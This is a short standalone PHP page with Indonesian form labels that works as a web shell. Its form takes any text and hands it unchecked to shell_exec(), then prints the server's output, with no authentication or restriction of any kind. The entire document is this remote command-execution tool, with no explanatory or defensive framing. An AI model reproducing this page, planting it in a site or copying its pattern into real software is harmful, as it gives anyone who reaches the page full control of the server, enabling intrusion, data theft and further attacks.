<!DOCTYPE html>
<html>
<head>
    <title>Execute Command</title>
</head>
<body>
    <h1>Execute Command</h1>
    <form method="post">
        <label for="command">Masukkan perintah:</label>
        <input type="text" name="command" id="command">
        <input type="submit" value="Jalankan">
    </form>

    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $command = $_POST['command'];
        $output = shell_exec($command);
        echo "<pre>$output</pre>";
    }
    ?>
</body>
</html>
